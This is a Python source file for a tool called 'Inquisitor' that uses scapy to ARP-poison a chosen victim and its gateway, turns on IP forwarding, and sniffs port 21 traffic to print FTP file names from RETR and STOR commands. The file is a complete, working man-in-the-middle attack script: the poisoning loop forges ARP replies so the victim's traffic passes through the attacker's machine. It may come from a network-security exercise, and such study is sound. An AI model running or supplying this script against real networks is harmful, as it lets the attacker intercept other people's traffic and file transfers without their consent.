import argparse
import sys
import time
import os
import threading
from scapy.all import *

def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="ARP Poisoning and FTP Sniffer Tool - Inquisitor")
    parser.add_argument("ip_src", help="Source IP (Gateway/Router IP)")
    parser.add_argument("mac_src", help="Source MAC (Gateway/Router MAC)")
    parser.add_argument("ip_target", help="Target IP (Victim IP)")
    parser.add_argument("mac_target", help="Target MAC (Victim MAC)")
    
    if len(sys.argv) != 5:
        parser.print_help()
        sys.exit(1)
        
    args = parser.parse_args()
    return args

def restore(ip_src, mac_src, ip_target, mac_target):
    """Send legitimate ARP packets to restore the network using Layer 2 sendp."""
    print("\n[*] Restoring ARP tables...")
    # L2 packet for the target (with the REAL MAC of the gateway)
    l2_packet_for_target = Ether(dst=mac_target) / ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src)
    
    # L2 packet for the gateway (with the REAL MAC of the target)
    l2_packet_for_gateway = Ether(dst=mac_src) / ARP(op=2, pdst=ip_src, hwdst=mac_src, psrc=ip_target, hwsrc=mac_target)
    
    # Send packets multiple times to ensure they are received
    sendp(l2_packet_for_target, count=4, verbose=False)
    sendp(l2_packet_for_gateway, count=4, verbose=False)
    print("[*] ARP tables restored.")

def poison_loop(ip_src, mac_src, ip_target, mac_target):
    """Send malicious ARP packets in a loop using Layer 2 sendp."""
    # L2 packet for the target: make it think WE are the gateway
    l2_packet_for_target = Ether(dst=mac_target) / ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src)
    
    # L2 packet for the gateway: make it think WE are the target
    l2_packet_for_gateway = Ether(dst=mac_src) / ARP(op=2, pdst=ip_src, hwdst=mac_src, psrc=ip_target)
    
    print("[*] Starting ARP poisoning... Press CTRL+C to stop.")
    while True:
        try:
            sendp(l2_packet_for_target, verbose=False)
            sendp(l2_packet_for_gateway, verbose=False)
            time.sleep(2)
        except KeyboardInterrupt:
            break

def ftp_sniffer(packet):
    """Callback function for each sniffed packet to find FTP commands."""
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode("utf-8", errors="ignore").strip()
            if payload.upper().startswith("RETR ") or payload.upper().startswith("STOR "):
                print(f"\n[+] FTP Filename detected: {payload}\n")
        except Exception:
            pass

def main():
    """Main function."""
    args = parse_args()
    
    print(f"[*] Starting Inquisitor...")
    print(f"    -> Gateway: {args.ip_src} ({args.mac_src})")
    print(f"    -> Target:  {args.ip_target} ({args.mac_target})")

    # Enable IP forwarding
    print("[*] Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # Start the poisoning thread
    poison_thread = threading.Thread(target=poison_loop, args=(args.ip_src, args.mac_src, args.ip_target, args.mac_target))
    poison_thread.daemon = True
    poison_thread.start()
    
    print("[*] Starting FTP sniffer on port 21...")
    try:
        # Start sniffing on the main thread
        sniff(filter="tcp port 21", prn=ftp_sniffer, store=False)
    except Exception as e:
        print(f"[!] An error occurred during sniffing: {e}")
    finally:
        # Restore ARP tables and disable IP forwarding before exiting
        restore(args.ip_src, args.mac_src, args.ip_target, args.mac_target)
        print("[*] Disabling IP forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[*] Inquisitor shut down.")

if __name__ == '__main__':
    main()